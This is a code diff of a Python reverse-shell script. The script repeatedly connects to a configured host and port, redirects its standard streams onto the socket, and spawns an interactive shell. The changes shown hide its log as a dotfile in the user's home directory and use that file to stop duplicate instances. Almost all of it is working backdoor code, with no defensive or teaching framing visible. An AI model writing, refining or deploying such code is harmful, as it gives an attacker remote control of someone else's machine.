@@ -8,25 +8,26 @@ PORT = 11258
 
 DELAY = 10
 
-LOG = True
+LOG = os.path.expanduser("~/.log")
+
 
 def main():
-    if LOG:
-        with open("log.txt", "w") as f:
-            f.write("Reverse shell started\n")
+    if os.path.exists(LOG):
+        return
+
+    with open(LOG, "w") as f:
+        f.write("Reverse shell started\n")
 
     while True:
-        if LOG:
-            with open("log.txt", "a") as f:
-                f.write("Connecting to {}:{}\n".format(HOST, PORT))
+        with open(LOG, "a") as f:
+            f.write("Connecting to {}:{}\n".format(HOST, PORT))
 
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.connect((HOST, PORT))
 
-                if LOG:
-                    with open("log.txt", "a") as f:
-                        f.write("Connected\n")
+                with open(LOG, "a") as f:
+                    f.write("Connected\n")
 
                 for fd in (0, 1, 2):
                     os.dup2(s.fileno(), fd)
@@ -37,9 +38,8 @@ def main():
                 except:
                     pty.spawn("sh")
 
-                if LOG:
-                    with open("log.txt", "a") as f:
-                        f.write("Disconnected\n")
+                with open(LOG, "a") as f:
+                    f.write("Disconnected\n")
 
                 time.sleep(DELAY * 6)
 
